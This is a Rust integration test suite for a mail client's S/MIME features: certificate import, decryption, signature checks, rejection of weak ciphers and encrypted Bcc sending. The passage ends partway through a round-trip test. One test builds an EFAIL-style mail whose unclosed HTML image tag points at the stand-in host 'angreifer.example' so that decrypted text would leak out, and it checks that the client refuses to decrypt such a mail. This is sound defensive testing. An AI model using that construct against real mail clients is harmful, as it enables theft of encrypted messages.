//! Integrationstests S/MIME (#56): Zertifikate importieren, Mails entschlüsseln und Signaturen
//! prüfen, verschlüsselt und signiert senden (auch als Rundlauf gegen den Test-Mailserver).
//!
//! Die Test-PKI in `tests/integration/daten/smime/` wurde eigens dafür erzeugt (siehe
//! LIESMICH.md dort). Testmails baut dieser Test selbst mit OpenSSL; nur Mails mit unsicheren
//! Verfahren (RC2, DES, MD5) liegen fertig bei, weil die mitgelieferte OpenSSL sie nicht mehr
//! erzeugen kann.

mod gemeinsam;

use std::sync::Arc;

use base64::Engine;
use openssl::cms::{CMSOptions, CmsContentInfo};
use openssl::pkey::PKey;
use openssl::stack::Stack;
use openssl::symm::Cipher;
use openssl::x509::X509;
use sichermail_lib::konto::schluesselbund::{Schluesselbund, SpeicherSchluesselbund};
use sichermail_lib::pgp::lesen::{Signatur, Verfahren, Verschluesselung};
use sichermail_lib::pgp::speicher::SchluesselDb;
use sichermail_lib::smime::lesen::{CBC_HINWEIS, SPERRSTATUS_HINWEIS};
use sichermail_lib::smime::{zertifikat, SmimeDienst};
use sichermail_lib::smtp::entwurf::Entwurf;
use sichermail_lib::smtp::nachricht::{self, Schutz};

const PASSWORT: &str = "test-passwort";

fn daten(name: &str) -> Vec<u8> {
    std::fs::read(format!(
        "{}/../tests/integration/daten/smime/{name}",
        env!("CARGO_MANIFEST_DIR")
    ))
    .unwrap()
}

fn zert(name: &str) -> X509 {
    X509::from_pem(&daten(&format!("{name}.pem"))).unwrap()
}

/// Neuer Dienst ohne Systemwurzeln (die Tests sollen nicht vom Rechner abhängen).
fn dienst(ordner: &std::path::Path, bund: Arc<dyn Schluesselbund>) -> SmimeDienst {
    SmimeDienst::mit_systemwurzeln(Arc::new(SchluesselDb::neu(ordner, bund)), false)
}

/// Dienst mit Annas Zertifikat (entsperrt) und übernommener Test-Wurzel.
fn dienst_fuer_anna(ordner: &std::path::Path) -> SmimeDienst {
    let d = dienst(ordner, Arc::new(SpeicherSchluesselbund::default()));
    d.eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    wurzel_uebernehmen(&d);
    d
}

fn wurzel_uebernehmen(d: &SmimeDienst) {
    let info = d.wurzel_lesen(&daten("test-ca.pem")).unwrap();
    assert_eq!(info.name, "SicherMail Test-Wurzel");
    d.wurzel_bestaetigen(&info.fingerabdruck).unwrap();
}

fn kopf(von: &str) -> String {
    format!(
        "From: {von}\r\nTo: Anna Test <anna@example.org>\r\nSubject: Geheim\r\nDate: Mon, 19 Oct 2026 10:00:00 +0200\r\nMessage-ID: <smime-test@example.org>\r\nMIME-Version: 1.0\r\n"
    )
}

const BEA: &str = "Bea Test <bea@example.org>";

const INHALT: &str =
    "Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\nHallo Anna, das ist geheim.\r\n";

fn base64_zeilen(daten: &[u8]) -> String {
    let text = base64::engine::general_purpose::STANDARD.encode(daten);
    text.as_bytes()
        .chunks(76)
        .map(|z| std::str::from_utf8(z).unwrap())
        .collect::<Vec<_>>()
        .join("\r\n")
}

fn pkcs7_mime(von: &str, smime_typ: &str, der: &[u8]) -> String {
    format!(
        "{}Content-Type: application/pkcs7-mime; smime-type={smime_typ}; name=\"smime.p7m\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"smime.p7m\"\r\n\r\n{}\r\n",
        kopf(von),
        base64_zeilen(der)
    )
}

/// Verschlüsselt eine MIME-Entität an Anna.
fn verschluesselt(von: &str, entitaet: &str, verfahren: Cipher) -> String {
    let mut empfaenger = Stack::new().unwrap();
    empfaenger.push(zert("anna")).unwrap();
    let gcm = verfahren.nid() == Cipher::aes_256_gcm().nid();
    let cms = CmsContentInfo::encrypt(
        &empfaenger,
        entitaet.as_bytes(),
        verfahren,
        CMSOptions::BINARY,
    )
    .unwrap();
    let typ = if gcm {
        "authEnveloped-data"
    } else {
        "enveloped-data"
    };
    pkcs7_mime(von, typ, &cms.to_der().unwrap())
}

/// Signiert eine Entität als `name` (Zertifikat und Schlüssel aus den Testdaten).
fn signatur(name: &str, entitaet: &[u8], abgetrennt: bool) -> Vec<u8> {
    let zertifikat = zert(name);
    let schluessel = PKey::private_key_from_pem(&daten(&format!("{name}.key"))).unwrap();
    let mut kette = Stack::new().unwrap();
    let aussteller = if name == "bea-fremd" {
        "fremd-ca"
    } else {
        "zwischen"
    };
    kette.push(zert(aussteller)).unwrap();
    let mut optionen = CMSOptions::BINARY;
    if abgetrennt {
        optionen |= CMSOptions::DETACHED;
    }
    CmsContentInfo::sign(
        Some(&zertifikat),
        Some(&schluessel),
        Some(&kette),
        Some(entitaet),
        optionen,
    )
    .unwrap()
    .to_der()
    .unwrap()
}

/// `multipart/signed` (abgetrennte Signatur).
fn signiert_entitaet(name: &str, inhalt: &str) -> String {
    let p7s = signatur(name, inhalt.as_bytes(), true);
    format!(
        "Content-Type: multipart/signed; protocol=\"application/pkcs7-signature\"; micalg=sha-256; boundary=\"grenze\"\r\n\r\n\
--grenze\r\n{inhalt}\r\n--grenze\r\nContent-Type: application/pkcs7-signature; name=\"smime.p7s\"\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n--grenze--\r\n",
        base64_zeilen(&p7s)
    )
}

fn signiert(von: &str, name: &str) -> String {
    format!("{}{}", kopf(von), signiert_entitaet(name, INHALT))
}

fn text(roh: &[u8]) -> String {
    String::from_utf8_lossy(roh).into_owned()
}

#[test]
fn eigenes_zertifikat_importieren() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));

    let fremde_adresse = d
        .eigenes_importieren("k1", "anna@example.org", &daten("eve.p12"), PASSWORT)
        .unwrap_err();
    assert!(
        fremde_adresse
            .meldung
            .contains("passt nicht zu diesem Konto")
            && fremde_adresse.meldung.contains("eve@example.org"),
        "{}",
        fremde_adresse.meldung
    );
    let falsches_passwort = d
        .eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), "falsch")
        .unwrap_err();
    assert!(falsches_passwort.meldung.contains("Passwort ist falsch"));
    let schwach = d
        .eigenes_importieren(
            "k1",
            "anna@example.org",
            &daten("anna-schwach.p12"),
            PASSWORT,
        )
        .unwrap_err();
    assert!(
        schwach.meldung.contains("zu schwach"),
        "{}",
        schwach.meldung
    );
    let server = d
        .eigenes_importieren(
            "k1",
            "anna@example.org",
            &daten("anna-server.p12"),
            PASSWORT,
        )
        .unwrap_err();
    assert!(
        server.meldung.contains("nicht für Mails"),
        "{}",
        server.meldung
    );
    assert!(d.uebersicht().unwrap().eigene.is_empty());

    let info = d
        .eigenes_importieren("k1", "Anna@Example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    assert_eq!(info.adressen, vec!["anna@example.org"]);
    assert_eq!(info.aussteller, "SicherMail Test-Zwischenstelle");
    assert!(!info.abgelaufen);
    let uebersicht = d.uebersicht().unwrap();
    assert_eq!(uebersicht.eigene.len(), 1);
    assert_eq!(uebersicht.eigene[0].konto, "k1");
    assert!(uebersicht.eigene[0].entsperrt);
}

#[test]
fn zertifikate_anderer_und_wurzeln_verwalten() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));
    let infos = d.fremde_importieren(&daten("bea.pem")).unwrap();
    assert_eq!(infos[0].adressen, vec!["bea@example.org"]);
    // DER-Datei (.cer) geht genauso.
    let der = zert("eve").to_der().unwrap();
    assert_eq!(d.fremde_importieren(&der).unwrap()[0].name, "Eve Test");
    // Eine Stelle ist kein Zertifikat einer Person.
    assert!(d.fremde_importieren(&daten("zwischen.pem")).is_err());
    assert!(d.fremde_importieren(b"kein Zertifikat").is_err());
    assert_eq!(d.uebersicht().unwrap().fremde.len(), 2);

    // Wurzel: erst lesen und anzeigen, dann mit Fingerabdruck bestätigen.
    assert!(d.wurzel_lesen(&daten("bea.pem")).is_err());
    let info = d.wurzel_lesen(&daten("test-ca.pem")).unwrap();
    assert!(d.uebersicht().unwrap().wurzeln.is_empty());
    assert!(d.wurzel_bestaetigen("00 11").is_err());
    // Nach einem falschen Fingerabdruck muss neu gelesen werden.
    assert!(d.wurzel_bestaetigen(&info.fingerabdruck).is_err());
    let info = d.wurzel_lesen(&daten("test-ca.pem")).unwrap();
    d.wurzel_bestaetigen(&info.fingerabdruck.to_lowercase())
        .unwrap();
    assert_eq!(d.uebersicht().unwrap().wurzeln, vec![info.clone()]);

    d.loeschen(&info.fingerabdruck).unwrap();
    assert!(d.uebersicht().unwrap().wurzeln.is_empty());
    assert!(d.loeschen(&info.fingerabdruck).is_err());
}

#[test]
fn ganze_mail_entschluesseln_cbc_und_gcm() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());

    let cbc = verschluesselt(BEA, INHALT, Cipher::aes_256_cbc());
    let ergebnis = d.verarbeiten(cbc.as_bytes());
    assert_eq!(ergebnis.status.verfahren, Verfahren::Smime);
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Keine);
    assert!(ergebnis.status.hinweise.contains(&CBC_HINWEIS.to_string()));
    let anzeige = text(&ergebnis.roh.unwrap());
    assert!(anzeige.contains("Hallo Anna, das ist geheim."));
    assert!(anzeige.contains("Subject: Geheim"));
    assert!(!anzeige.contains("pkcs7-mime"));

    let gcm = verschluesselt(BEA, INHALT, Cipher::aes_256_gcm());
    assert!(gcm.contains("authEnveloped-data"));
    let ergebnis = d.verarbeiten(gcm.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert!(
        ergebnis.status.hinweise.is_empty(),
        "{:?}",
        ergebnis.status.hinweise
    );
    assert!(text(&ergebnis.roh.unwrap()).contains("Hallo Anna"));

    // Signiert, dann verschlüsselt (CBC): kein Hinweis, Signatur gültig.
    let innen = signiert_entitaet("bea", INHALT);
    let ergebnis = d.verarbeiten(verschluesselt(BEA, &innen, Cipher::aes_128_cbc()).as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(!ergebnis.status.hinweise.contains(&CBC_HINWEIS.to_string()));
    let anzeige = text(&ergebnis.roh.unwrap());
    assert!(anzeige.contains("Hallo Anna"));
    assert!(!anzeige.contains("pkcs7-signature"));
}

#[test]
fn passphrase_nach_neustart_noetig() {
    let ordner = tempfile::tempdir().unwrap();
    let bund: Arc<dyn Schluesselbund> = Arc::new(SpeicherSchluesselbund::default());
    let d = dienst(ordner.path(), bund.clone());
    let info = d
        .eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    drop(d);

    let d = dienst(ordner.path(), bund);
    assert!(!d.uebersicht().unwrap().eigene[0].entsperrt);
    let mail = verschluesselt(BEA, INHALT, Cipher::aes_256_cbc());
    let ergebnis = d.verarbeiten(mail.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );
    assert_eq!(
        ergebnis.status.passphrase_fuer,
        Some(info.fingerabdruck.clone())
    );
    assert!(ergebnis.roh.is_none());

    assert!(d.entsperren(&info.fingerabdruck, "falsch").is_err());
    d.entsperren(&info.fingerabdruck, PASSWORT).unwrap();
    let ergebnis = d.verarbeiten(mail.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
}

#[test]
fn ohne_passendes_zertifikat_und_teilweise_verschluesselt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));
    let mail = verschluesselt(BEA, INHALT, Cipher::aes_256_cbc());
    let ergebnis = d.verarbeiten(mail.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );
    assert!(ergebnis.status.meldung.unwrap().contains("kein passendes"));

    // Verschlüsselter Teil neben unverschlüsseltem Inhalt: nicht entschlüsseln (EFAIL).
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let mut empfaenger = Stack::new().unwrap();
    empfaenger.push(zert("anna")).unwrap();
    let cms = CmsContentInfo::encrypt(
        &empfaenger,
        INHALT.as_bytes(),
        Cipher::aes_256_cbc(),
        CMSOptions::BINARY,
    )
    .unwrap();
    let teilweise = format!(
        "{}Content-Type: multipart/mixed; boundary=\"gemischt\"\r\n\r\n--gemischt\r\nContent-Type: text/html\r\n\r\n<img src=\"https://angreifer.example/?\r\n--gemischt\r\nContent-Type: application/pkcs7-mime; smime-type=enveloped-data\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n--gemischt--\r\n",
        kopf(BEA),
        base64_zeilen(&cms.to_der().unwrap())
    );
    let ergebnis = d.verarbeiten(teilweise.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Teilweise
    );
    assert!(ergebnis.roh.is_none());
}

#[test]
fn unsichere_verfahren_werden_abgelehnt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    for (datei, verfahren) in [("unsicher-rc2-40.eml", "RC2"), ("unsicher-des.eml", "DES")] {
        let ergebnis = d.verarbeiten(&daten(datei));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::NichtEntschluesselt,
            "{datei}"
        );
        let meldung = ergebnis.status.meldung.unwrap();
        assert!(
            meldung.contains(&format!("unsichere Verfahren {verfahren}")),
            "{meldung}"
        );
        assert!(ergebnis.roh.is_none());
    }
    let ergebnis = d.verarbeiten(&daten("unsicher-md5.eml"));
    assert_eq!(ergebnis.status.signatur, Signatur::Ungueltig);
    assert!(ergebnis.status.meldung.unwrap().contains("MD5"));
}

#[test]
fn signaturen_pruefen() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());

    // Gültig: vertrauenswürdige Kette, passender Absender.
    let ergebnis = d.verarbeiten(signiert(BEA, "bea").as_bytes());
    assert_eq!(ergebnis.status.verfahren, Verfahren::Smime);
    assert_eq!(
        ergebnis.status.signatur,
        Signatur::Gueltig,
        "{:?}",
        ergebnis.status
    );
    assert!(!ergebnis.status.signatur_teilweise);
    assert_eq!(
        ergebnis.status.signierer.as_deref(),
        Some("Bea Test <bea@example.org>")
    );
    assert!(ergebnis
        .status
        .hinweise
        .contains(&SPERRSTATUS_HINWEIS.to_string()));
    assert!(ergebnis.status.zertifikat_uebernehmbar);
    let anzeige = text(&ergebnis.roh.unwrap());
    assert!(anzeige.contains("Hallo Anna"));
    assert!(!anzeige.contains("pkcs7-signature"));

    // Opake Signatur (application/pkcs7-mime; smime-type=signed-data)
    let opak = pkcs7_mime(
        BEA,
        "signed-data",
        &signatur("bea", INHALT.as_bytes(), false),
    );
    let ergebnis = d.verarbeiten(opak.as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("Hallo Anna"));

    // Unbekannte Stelle
    let ergebnis = d.verarbeiten(signiert(BEA, "bea-fremd").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Unbekannt);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);

    // Abgelaufen
    let ergebnis = d.verarbeiten(signiert(BEA, "bea-abgelaufen").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Abgelaufen);

    // Verändert
    let veraendert = signiert(BEA, "bea").replace("das ist geheim", "das ist GEHEIM");
    let ergebnis = d.verarbeiten(veraendert.as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Ungueltig);

    // Falscher Absender
    let ergebnis = d.verarbeiten(signiert("Eve <eve@example.org>", "bea").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::AndereAdresse);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);

    // Nur ein Teil signiert
    let teilweise = format!(
        "{}Content-Type: multipart/mixed; boundary=\"gemischt\"\r\n\r\n--gemischt\r\nContent-Type: text/plain\r\n\r\nUnsignierter Zusatz\r\n--gemischt\r\n{}\r\n--gemischt--\r\n",
        kopf(BEA),
        signiert_entitaet("bea", INHALT)
    );
    let ergebnis = d.verarbeiten(teilweise.as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(ergebnis.status.signatur_teilweise);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);
}

#[test]
fn ohne_uebernommene_wurzel_ist_die_stelle_unbekannt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));
    let ergebnis = d.verarbeiten(signiert(BEA, "bea").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Unbekannt);
    wurzel_uebernehmen(&d);
    assert_eq!(
        d.verarbeiten(signiert(BEA, "bea").as_bytes())
            .status
            .signatur,
        Signatur::Gueltig
    );
}

#[test]
fn zertifikat_aus_gueltig_signierter_mail_uebernehmen() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    assert!(d
        .aus_mail_uebernehmen(signiert(BEA, "bea-fremd").as_bytes())
        .is_err());
    assert!(d
        .aus_mail_uebernehmen(signiert("Eve <eve@example.org>", "bea").as_bytes())
        .is_err());
    let info = d
        .aus_mail_uebernehmen(signiert(BEA, "bea").as_bytes())
        .unwrap();
    assert_eq!(info.adressen, vec!["bea@example.org"]);
    assert_eq!(d.uebersicht().unwrap().fremde, vec![info]);
    // Danach wird es nicht mehr angeboten.
    let ergebnis = d.verarbeiten(signiert(BEA, "bea").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);
}

#[test]
fn openpgp_mails_bleiben_unberuehrt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let pgp = format!(
        "{}Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"g\"\r\n\r\n--g\r\n{INHALT}\r\n--g\r\nContent-Type: application/pgp-signature\r\n\r\nx\r\n--g--\r\n",
        kopf(BEA)
    );
    let ergebnis = d.verarbeiten(pgp.as_bytes());
    assert!(ergebnis.roh.is_none());
    assert_eq!(ergebnis.status.signatur, Signatur::Keine);
    assert_eq!(ergebnis.status.verfahren, Verfahren::OpenPgp);
}

#[test]
fn fingerabdruck_ist_sha256() {
    let hex = zertifikat::fingerabdruck_hex(&zert("bea"));
    assert_eq!(hex.len(), 64);
    assert_eq!(
        zertifikat::fingerabdruck_normal(&zertifikat::fingerabdruck_anzeige(&hex)),
        hex
    );
}

#[test]
fn mails_von_der_openssl_kommandozeile() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let ergebnis = d.verarbeiten(&daten("cli-signiert.eml"));
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("Geheimer Testinhalt"));

    // BER mit unbestimmter Länge, innen signiert
    let roh = daten("cli-verschluesselt.eml");
    assert!(
        text(&roh).contains("\r\n\r\nMIAG"),
        "Testmail soll BER enthalten"
    );
    let ergebnis = d.verarbeiten(&roh);
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("Geheimer Testinhalt"));
}

// --- Senden -------------------------------------------------------------------------------

/// Konto „Anna“ ohne Server (für das Bauen der Mail).
fn anna_konto() -> sichermail_lib::konto::Konto {
    let server = sichermail_lib::konto::ServerEinstellung {
        host: "mail.example.org".into(),
        port: 465,
        verschluesselung: sichermail_lib::konto::Verschluesselung::Tls,
        zertifikat: None,
    };
    sichermail_lib::konto::Konto {
        id: "k1".into(),
        name: "Anna Test".into(),
        email: "anna@example.org".into(),
        benutzername: "anna".into(),
        imap: server.clone(),
        smtp: server,
        gesendet_ablegen: true,
        absender_kennung: String::new(),
    }
}

/// Dienst für jemanden mit eigenem Zertifikat (`name.p12`) und übernommener Test-Wurzel.
fn dienst_fuer(ordner: &std::path::Path, name: &str) -> SmimeDienst {
    let d = dienst(ordner, Arc::new(SpeicherSchluesselbund::default()));
    d.eigenes_importieren(
        "k1",
        &format!("{name}@example.org"),
        &daten(&format!("{name}.p12")),
        PASSWORT,
    )
    .unwrap();
    wurzel_uebernehmen(&d);
    d
}

fn smime_entwurf(an: &str, bcc: &str, verschluesseln: bool, signieren: bool) -> Entwurf {
    Entwurf {
        konto: "k1".into(),
        an: an.into(),
        bcc: bcc.into(),
        betreff: "Vertraulich".into(),
        text: "Hallo Bea,\n\ndas ist vertraulich.\n".into(),
        verschluesseln,
        signieren,
        verfahren: Verfahren::Smime,
        ..Default::default()
    }
}

#[test]
fn ohne_gueltiges_empfaenger_zertifikat_wird_nicht_gesendet() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let adressen = vec![
        "bea@example.org".to_string(),
        "carl@example.org".to_string(),
    ];

    // Kein Zertifikat für Bea und Carl
    let pruefung = d.versand_pruefen("k1", &adressen, true, false).unwrap();
    assert_eq!(pruefung.fehlende_empfaenger, adressen);
    let fehler = d
        .versand_vorbereiten("k1", &adressen, true, false)
        .err()
        .unwrap();
    assert_eq!(fehler.art, "smime_zertifikat_fehlt");
    assert!(
        fehler.meldung.contains("carl@example.org"),
        "{}",
        fehler.meldung
    );

    // Abgelaufenes Zertifikat zählt nicht.
    d.fremde_importieren(&daten("bea-abgelaufen.pem")).unwrap();
    let pruefung = d.versand_pruefen("k1", &adressen, true, false).unwrap();
    assert!(pruefung
        .fehlende_empfaenger
        .contains(&"bea@example.org".to_string()));
    // Von unbekannter Stelle auch nicht.
    d.fremde_importieren(&daten("bea-fremd.pem")).unwrap();
    let pruefung = d.versand_pruefen("k1", &adressen, true, false).unwrap();
    assert!(pruefung
        .fehlende_empfaenger
        .contains(&"bea@example.org".to_string()));
    // Gültig: Nur noch Carl fehlt.
    d.fremde_importieren(&daten("bea.pem")).unwrap();
    let pruefung = d.versand_pruefen("k1", &adressen, true, false).unwrap();
    assert_eq!(pruefung.fehlende_empfaenger, vec!["carl@example.org"]);

    // Ohne eigenes Zertifikat geht gar nichts.
    let pruefung = d
        .versand_pruefen("k2", &adressen[..1], false, true)
        .unwrap();
    assert!(pruefung.eigener_fehlt);
}

#[test]
fn signieren_braucht_die_passphrase_nach_neustart() {
    let ordner = tempfile::tempdir().unwrap();
    let bund: Arc<dyn Schluesselbund> = Arc::new(SpeicherSchluesselbund::default());
    let d = dienst(ordner.path(), bund.clone());
    let info = d
        .eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    drop(d);
    let d = dienst(ordner.path(), bund);
    let adressen = vec!["bea@example.org".to_string()];
    let pruefung = d.versand_pruefen("k1", &adressen, false, true).unwrap();
    assert_eq!(pruefung.passphrase_fuer, Some(info.fingerabdruck.clone()));
    assert_eq!(
        d.versand_vorbereiten("k1", &adressen, false, true)
            .err()
            .unwrap()
            .art,
        "smime_passphrase"
    );
    d.entsperren(&info.fingerabdruck, PASSWORT).unwrap();
    assert!(d.versand_vorbereiten("k1", &adressen, false, true).is_ok());
}

#[test]
fn verschluesselt_und_signiert_mit_bcc() {
    let ordner = tempfile::tempdir().unwrap();
    let anna = dienst_fuer_anna(ordner.path());
    anna.fremde_importieren(&daten("bea.pem")).unwrap();
    anna.fremde_importieren(&daten("eve.pem")).unwrap();
    let entwurf = smime_entwurf("Bea Test <bea@example.org>", "eve@example.org", true, true);
    let adressen = nachricht::alle_empfaenger(&entwurf).unwrap();
    let versand = anna
        .versand_vorbereiten("k1", &adressen, true, true)
        .unwrap();
    let gebaut = nachricht::bauen_geschuetzt(
        &anna_konto(),
        &entwurf,
        &[nachricht::AnhangDaten {
            name: "plan.txt".into(),
            typ: "text/plain".into(),
            daten: b"Geheimer Plan".to_vec(),
        }],
        Some(Schutz::Smime(&versand)),
    )
    .unwrap();
    assert_eq!(
        gebaut.sendungen.len(),
        2,
        "An und eine eigene Sendung für Bcc"
    );
    let haupt = &gebaut.sendungen[0].daten;
    let fuer_bcc = &gebaut.sendungen[1].daten;
    for roh in [haupt, fuer_bcc] {
        let t = text(roh);
        assert!(t.contains("application/pkcs7-mime"), "{t}");
        assert!(t.contains("smime-type=enveloped-data"));
        assert!(!t.contains("Geheimer Plan") && !t.contains("vertraulich"));
        // Bcc steht in keiner versendeten Nachricht.
        assert!(!t.contains("eve@example.org"));
    }

    let bea_ordner = tempfile::tempdir().unwrap();
    let bea = dienst_fuer(bea_ordner.path(), "bea");
    let eve_ordner = tempfile::tempdir().unwrap();
    let eve = dienst_fuer(eve_ordner.path(), "eve");

    // Bea liest die Hauptnachricht: entschlüsselt, gültig signiert von Anna, mit Anhang.
    let ergebnis = bea.verarbeiten(haupt);
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(ergebnis.status.hinweise.iter().all(|h| h != CBC_HINWEIS));
    let klartext = text(&ergebnis.roh.unwrap());
    assert!(klartext.contains("plan.txt"));
    assert!(klartext.contains("das ist vertraulich"));

    // Die Hauptnachricht ist nicht an Eve verschlüsselt, die Bcc-Nachricht nur an Eve.
    assert_eq!(
        eve.verarbeiten(haupt).status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );
    let fuer_eve = eve.verarbeiten(fuer_bcc);
    assert_eq!(
        fuer_eve.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
    assert_eq!(fuer_eve.status.signatur, Signatur::Gueltig);
    assert_eq!(
        bea.verarbeiten(fuer_bcc).status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );
    assert_eq!(
        anna.verarbeiten(fuer_bcc).status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );

    // „Gesendet“ ist für Anna lesbar und nennt Bcc.
    assert!(text(&gebaut.fuer_gesendet).contains("eve@example.org"));
    assert_eq!(
        anna.verarbeiten(&gebaut.fuer_gesendet)
            .status
            .verschluesselung,
        Verschluesselung::Entschluesselt
    );
}

#[test]
fn nur_signiert_ist_gueltig() {
    let ordner = tempfile::tempdir().unwrap();
    let anna = dienst_fuer_anna(ordner.path());
    let entwurf = smime_entwurf("bea@example.org", "", false, true);
    let versand = anna
        .versand_vorbereiten("k1", &["bea@example.org".into()], false, true)
        .unwrap();
    let gebaut =
        nachricht::bauen_geschuetzt(&anna_konto(), &entwurf, &[], Some(Schutz::Smime(&versand)))
            .unwrap();
    let roh = &gebaut.sendungen[0].daten;
    let t = text(roh);
    assert!(t.contains("multipart/signed"), "{t}");
    assert!(t.contains("application/pkcs7-signature"));
    assert!(t.contains("sha-256"));
    assert!(t.contains("das ist vertraulich"));

    let bea_ordner = tempfile::tempdir().unwrap();
    let bea = dienst_fuer(bea_ordner.path(), "bea");
    let ergebnis = bea.verarbeiten(roh);
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert_eq!(ergebnis.status.verschluesselung, Verschluesselung::Keine);
    assert_eq!(
        ergebnis.status.signierer.as_deref(),
        Some("Anna Test <anna@example.org>")
    );
}

#[tokio::test]
#[ignore = "braucht den Test-Mailserver (scripts/test-mailserver.sh start)"]
async fn rundlauf_senden_empfangen_entschluesseln() {
    use futures_util::TryStreamExt;
    use gemeinsam::{direkte_sitzung, eingabe, zustellen};
    use sichermail_lib::imap::cache::SpeicherCache;
    use sichermail_lib::imap::dienst::ImapDienst;
    use sichermail_lib::smtp::dienst::SendeDienst;

    // Postfächer anlegen (GreenMail legt sie beim ersten Empfang an).
    for adresse in ["anna@example.org", "bea@example.org", "eve@example.org"] {
        zustellen(adresse, &["Willkommen"]).await;
    }
    // Konto mit der Adresse aus Annas Zertifikat
    let konto_ordner = tempfile::tempdir().unwrap();
    let konten = Arc::new(sichermail_lib::konto::KontoVerwaltung::neu(
        konto_ordner.path(),
        Arc::new(SpeicherSchluesselbund::default()),
    ));
    let mut konto_eingabe = eingabe("anna@example.org", "anna@example.org");
    konto_eingabe.name = "Anna Test".into();
    konto_eingabe.email = "anna@example.org".into();
    let konto = konten.speichern(&konto_eingabe).await.unwrap();
    let schluessel_ordner = tempfile::tempdir().unwrap();
    let anna = Arc::new(dienst(
        schluessel_ordner.path(),
        Arc::new(SpeicherSchluesselbund::default()),
    ));
    anna.eigenes_importieren(&konto.id, "anna@example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    wurzel_uebernehmen(&anna);
    anna.fremde_importieren(&daten("bea.pem")).unwrap();
    anna.fremde_importieren(&daten("eve.pem")).unwrap();

    let imap = Arc::new(ImapDienst::neu(
        konten.clone(),
        Arc::new(SpeicherCache::default()),
    ));
    let senden = SendeDienst::neu(konten, imap).mit_smime(anna.clone());
    let betreff = format!("S/MIME-Rundlauf {}", uuid::Uuid::new_v4().simple());

    // Fehlt ein Zertifikat, wird nichts gesendet.
    let mut entwurf = smime_entwurf("bea@example.org", "carl@example.org", true, true);
    entwurf.konto = konto.id.clone();
    entwurf.betreff = betreff.clone();
    let fehler = senden.senden(&entwurf).await.unwrap_err();
    assert!(
        fehler.meldung.contains("carl@example.org"),
        "{}",
        fehler.meldung
    );

    entwurf.bcc = "eve@example.org".into();
    entwurf.id = None;
    let ergebnis = senden.senden(&entwurf).await.unwrap();
